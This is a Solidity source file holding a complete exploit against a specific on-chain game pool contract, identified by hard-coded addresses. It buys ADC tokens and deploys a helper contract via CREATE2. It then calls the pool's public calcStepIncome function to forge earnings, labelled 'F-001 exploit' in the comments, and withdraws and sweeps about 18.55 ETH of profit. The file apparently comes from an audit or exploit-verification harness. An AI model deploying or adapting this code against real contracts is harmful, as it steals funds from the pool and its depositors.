// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMainPool {
    function joinGame(address parentAddr) external payable;
    function withdraw() external;
    function RID() external view returns (uint256);
    function plyrID(address player) external view returns (uint256);
    function calcStepIncome(uint256 pid_, uint256 value_, uint8 dividendAccount_) external;
    function mainPoolWithdrawBalance(uint256 rid_) external view returns (uint256);
    function mainPoolBalance(uint256 rid_) external view returns (uint256);
    function plyr(uint256 rid_, uint256 pid_)
        external view
        returns (
            uint256 ticketInCost,
            uint256 withdrawAmount,
            uint256 startTime,
            uint256 totalSettled,
            uint256 staticIncome,
            uint256 lastCalcSITime,
            uint256 dynamicIncome,
            uint256 stepIncome,
            bool isActive,
            bool isAlreadGetIns
        );
    function plyWithdrawBalance(uint256 rid_, uint256 pid_) external view returns (uint256);
    function playBiggertReward(uint256 rid_, uint256 pid_) external view returns (uint256);
}

interface ITicket {
    function buyADC() external payable;
    function calDeductionADC(uint256 _value, bool isIn_) external view returns (uint256);
}

interface IADC {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract AttackPlayer {
    address public immutable owner;
    address public immutable pool;
    receive() external payable {}
    constructor(address pool_, address parent_, uint256 joinValue_) payable {
        owner = msg.sender;
        pool = pool_;
        IMainPool(pool_).joinGame{value: joinValue_}(parent_);
    }
    function doWithdraw() external {
        require(msg.sender == owner, "not owner");
        IMainPool(pool).withdraw();
    }
    function sweep() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}

contract FlawVerifier {
    address constant TARGET = 0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8;
    address constant TICKET = 0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50;
    address constant ADC = 0xD357e4940b34Eb1406ef6A1Af53954e641273a3B;
    address constant VIP1 = 0x953ad059b61aA4A23fa48d5eca617D4920E3343e;
    IMainPool constant pool = IMainPool(TARGET);
    ITicket constant ticket = ITicket(TICKET);
    IADC constant adc = IADC(ADC);

    bool internal _executed;
    uint256 internal _baselineEth;
    uint256 internal _profitAmount;
    address internal _profitToken;

    receive() external payable {}

    constructor() {
        _profitToken = address(0);
    }

    function executeOnOpportunity() external {
        if (_executed) { _syncProfit(); return; }
        _executed = true;
        _baselineEth = address(this).balance;

        uint256 rid = pool.RID();
        uint256 cpWd = pool.mainPoolWithdrawBalance(rid); // 21.85 ETH

        // Max profit: join 14 ETH -> cap = 35 ETH (14 * 2.5)
        // After join: pool = 21.85 + 14*0.95 = 35.15 ETH
        // cap 35 < 35.15 => safe withdrawal
        // Profit = 35 - 14 - ADC_costs ~= 18.55 ETH

        uint256 joinWei = 14 ether;
        uint256 capWei = (joinWei * 25) / 10; // 35 ETH

        uint256 joinFeeAdc = ticket.calDeductionADC(joinWei, true);   // 3500e18
        uint256 wdFeeAdc = ticket.calDeductionADC(capWei, false);    // 8750e18
        // Add 10 smallest units to satisfy balance > fee (strict > check)
        uint256 wdFeePlus = wdFeeAdc + 10;

        // Buy ADC tokens
        _buyAdc(joinFeeAdc + wdFeePlus);

        // Deploy player via CREATE2
        bytes32 salt = bytes32(uint256(uint160(address(this))));
        address playerAddr = _computePlayerAddress(salt, joinWei);

        // Fund player with ADC for join fee (burned by distroy in joinGame)
        require(adc.transfer(playerAddr, joinFeeAdc), "prefund ADC fail");

        // Deploy player contract - constructor joins the game
        new AttackPlayer{salt: salt, value: joinWei}(TARGET, VIP1, joinWei);
        uint256 pid = pool.plyrID(playerAddr);
        require(pid > 11, "bad PID");

        // Fund player with ADC for withdraw fee (> wdFeeAdc to pass strict > check)
        require(adc.transfer(playerAddr, wdFeePlus), "wd fund fail");

        // F-001 exploit: public calcStepIncome forges earnings up to playBiggertReward cap
        pool.calcStepIncome(pid, capWei, 100);

        // Withdraw - player has > wdFeeAdc, check passes
        (bool ok1,) = playerAddr.call(abi.encodeWithSignature("doWithdraw()"));
        require(ok1, "withdraw fail");

        // Sweep ETH back
        (bool ok2,) = playerAddr.call(abi.encodeWithSignature("sweep()"));
        require(ok2, "sweep fail");

        _syncProfit();
    }

    function _buyAdc(uint256 minOut) internal {
        uint256 curr = adc.balanceOf(address(this));
        if (curr >= minOut) return;
        uint256 shortfall = minOut - curr;
        uint256 ethToUse = (shortfall * 1e18 + 5000e18 - 1) / 5000e18 + 0.5 ether;
        if (ethToUse > address(this).balance) ethToUse = address(this).balance;
        ticket.buyADC{value: ethToUse}();
    }

    function _computePlayerAddress(bytes32 salt, uint256 joinWei) internal view returns (address) {
        bytes memory initCode = abi.encodePacked(
            type(AttackPlayer).creationCode,
            abi.encode(TARGET, VIP1, joinWei)
        );
        return address(uint160(uint256(keccak256(
            abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(initCode))
        ))));
    }

    function profitToken() external view returns (address) { return _profitToken; }
    function profitAmount() external view returns (uint256) { return _profitAmount; }

    function _syncProfit() internal {
        uint256 current = address(this).balance;
        _profitAmount = current > _baselineEth ? current - _baselineEth : 0;
    }
}
